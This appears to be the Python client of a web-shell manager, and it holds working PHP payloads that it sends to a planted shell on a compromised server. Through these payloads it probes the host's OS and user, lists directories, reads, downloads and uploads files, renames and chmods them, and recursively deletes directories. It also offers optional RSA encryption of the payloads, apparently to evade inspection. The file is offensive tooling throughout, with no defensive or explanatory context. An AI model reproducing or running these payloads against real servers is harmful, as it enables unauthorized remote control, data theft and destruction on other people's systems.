#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author: r1ngs
# contact: r1ngs@outlook.com
# datetime: 2021/1/8 18:16
# software: PyCharm

import requests, os, sys, json
from random import randint
from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes, bytes_to_long

current_path = os.path.dirname(os.path.realpath(sys.argv[0]))

def genRandomStr(num):
    r = []
    for _ in range(num):
        r.append(hex(randint(16 ** 7, 16 ** 8))[2:])
    return r


def encrypt(plaintext):

    def pad(plaintext):
        tmp = chr(0x01) + chr(0xff) * (125 - len(plaintext)) + chr(0x00) + plaintext
        return bytes([ord(c) for c in tmp])

    try:
        with open(current_path + "/Cache/RSAkey.json", "r") as f:
            d = json.load(f)
            priKey = d['私钥']
            keys = RSA.importKey(priKey)

            # 使用私钥加密
            # chunkSize大小有限制，应该是openSSL的填充规则
            chunkSize = 110
            plainList = [plaintext[i: i + chunkSize] for i in range(0, len(plaintext), chunkSize)]
            cipher = ''
            for m in plainList:
                # print(pad(m))
                m = bytes_to_long(pad(m))
                d = keys.d
                n = keys.n
                c = pow(m, d, n)

                cipher += b64encode(long_to_bytes(c)).decode()
                cipher += '|'

            return cipher[:-1]

    except:
        raise Exception('请先生成PHP-RSA密钥')


def TestConn(url, password, useRSA):
    ra, rb = genRandomStr(2)
    testPayload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function ' \
                  'asoutput(){$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}' \
                  'ob_start();try{$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);' \
                  '$R="{$D}\n";if(substr($D,0,1)!="/"){foreach(range("C","Z")as $L)if(is_dir("{$L}:"))$R.="{$L}:";}else' \
                  '{$R.="/";}$R.="\n";$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";$s=($u)' \
                  '?$u["name"]:@get_current_user();$R.=php_uname();$R.="\n{$s}";echo $R;;}catch(Exception $e){echo ' \
                  '"ERROR://".$e->getMessage();};asoutput();die();'
    if useRSA == '是':
        testPayload = encrypt(testPayload)
    data = {password: testPayload}

    return requestAndResponse(url, data, ra, rb)


def scanDir(url, password, dir, useRSA):
    ra, rb, rc = genRandomStr(3)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function ' \
              'asoutput(){$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}' \
              'ob_start();try{$D=base64_decode($_POST["' + rc + '"]);$F=@opendir($D);if($F==NULL)' \
              '{echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F))' \
              '{$P=$D.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);' \
              '$R="\t".$T."\t".@filesize($P)."\t".$E."\n";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;' \
              '@closedir($F);};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    c = b64encode(dir.encode()).decode()
    if useRSA == '是':
        payload = encrypt(payload)
        c = encrypt(c)
    data = {password: payload, rc: c}

    return requestAndResponse(url, data, ra, rb)


def downloadFile(url, password, filePath, useRSA):
    ra, rb, rc = genRandomStr(3)
    payload = 'header("Content-Type: application/octet-stream");@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}ob_start();' \
              'try{$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["' + rc + '"]):$_POST["' + rc + '"]);' \
              '$fp=@fopen($F,"r");if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};}' \
              'catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    c = b64encode(filePath.encode()).decode()
    if useRSA == '是':
        payload = encrypt(payload)
        c = encrypt(c)
    data = {password: payload, rc: c}

    return requestAndResponse(url, data, ra, rb)

def uploadFile(url, password, buffer, filePath, useRSA):
    buffer = buffer.encode().hex()

    ra, rb, rc, rd = genRandomStr(4)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}ob_start();' \
              'try{$f=base64_decode($_POST["' + rd + '"]);$c=$_POST["' + rc + '"];$c=str_replace("\n","",$c);' \
              '$c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));' \
              'echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    c = buffer
    d = b64encode(filePath.encode()).decode()
    if useRSA == '是':
        payload = encrypt(payload)
        c = encrypt(c)
        d = encrypt(d)
    data = {password: payload, rd: d, rc: c}

    return requestAndResponse(url, data, ra, rb)


def renameFile(url, password, src, dst, useRSA):
    ra, rb, rs, rd = genRandomStr(4)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}ob_start();' \
              'try{$m=get_magic_quotes_gpc();$src=base64_decode(m?stripslashes($_POST["' + rs + '"]):$_POST' \
              '["' + rs + '"]);$dst=base64_decode(m?stripslashes($_POST["' + rd + '"]):$_POST["' + rd + '"]' \
              ');echo(rename($src,$dst)?"1":"0");;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    s = b64encode(src.encode()).decode()
    d = b64encode(dst.encode()).decode()
    if useRSA == '是':
        payload = encrypt(payload)
        s = encrypt(s)
        d = encrypt(d)
    data = {password: payload, rs: s, rd: d}

    return requestAndResponse(url, data, ra, rb)


def deleteFile(url, password, file, useRSA):
    ra, rb, rc = genRandomStr(3)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}ob_start();' \
              'try{function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;if((is_dir($pf))&&($f!=".")&&($f!=".."))' \
              '{@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chmod($p,0777);' \
              'return @rmdir($p);}$F=base64_decode(get_magic_quotes_gpc()?stripslashes($_POST["' + rc + '"]):$_POST' \
              '["' + rc + '"]);if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};}' \
              'catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    c = b64encode(file.encode()).decode()
    if useRSA == '是':
        payload = encrypt(payload)
        c = encrypt(c)
    data = {password: payload, rc: c}

    return requestAndResponse(url, data, ra, rb)


def chmodFile(url, password, file, mode, useRSA):
    ra, rb, rc, rd = genRandomStr(4)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}ob_start();try' \
              '{$m=get_magic_quotes_gpc();$FN=base64_decode(m?stripslashes($_POST["' + rc + '"]):$_POST["' + rc + '"]);' \
              '$mode=base64_decode(m?stripslashes($_POST["' + rd + '"]):$_POST["' + rd + '"]);echo(chmod($FN,octdec($mode))?"1":"0")' \
              ';;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    c = b64encode(file.encode()).decode()
    d = b64encode(mode.encode()).decode()
    if useRSA == '是':
        payload = encrypt(payload)
        c = encrypt(c)
        d = encrypt(d)
    data = {password: payload, rc: c, rd: d}
    return requestAndResponse(url, data, ra, rb)


def readFile(url, password, file, useRSA):
    ra, rb, rc = genRandomStr(3)
    payload = '@ini_set("display_errors", "0");@set_time_limit(0);function asenc($out){return $out;};function asoutput()' \
              '{$output=ob_get_contents();ob_end_clean();echo "' + ra + '";echo @asenc($output);echo "' + rb + '";}ob_start();' \
              'try{$F=base64_decode($_POST["' + rc + '"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)?filesize($F):' \
              '4096));@fclose($P);;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();'
    c = b64encode(file.encode()).decode()
    if useRSA == '是':
        payload = encrypt(payload)
        c = encrypt(c)
    data = {password: payload, rc: c}

    return requestAndResponse(url, data, ra, rb)


def requestAndResponse(url, data, ra, rb):
    r = requests.post(url, data, timeout=0.8)
    rt = r.text

    # 排除404等的测试结果
    if r.status_code != 200:
        raise Exception('status_code == ' + str(r.status_code))
    # 是否正确对payload进行响应
    if rt[8:].startswith('ERROR://'):
        raise Exception(rt[8:-8])

    if rt.startswith(ra) and rt.endswith(rb):
        return rt[8:-8]
    else:
        raise Exception('PassWord Error!')

if __name__ == '__main__':
    url = 'http://127.0.0.1/shell.php'
    password = '123'
    # print(downloadFile(url, password, 'C:/Users/r1ngs/Desktop/1.txt', '否'))
    # print(uploadFile(url, password, '123', 'C:/Users/r1ngs/D123esktop/1.txt', '否'))
    # print(scanDir(url, password, 'C:', '否'))
    # print(TestConn(url, password, '否'))
    # print(renameFile(url, password, 'C:/Users/r1ngs/Desktop/1231.txt', 'C:/Users/r1ngs/Desktop/123.txt', '否'))
    # print(deleteFile(url, password, 'C:/Users/r1ngs/Desktop/1231.txt', '否'))
    print(readFile(url, password, 'C:/Users/r1ngs/Desktop/1231.txt', '否'))
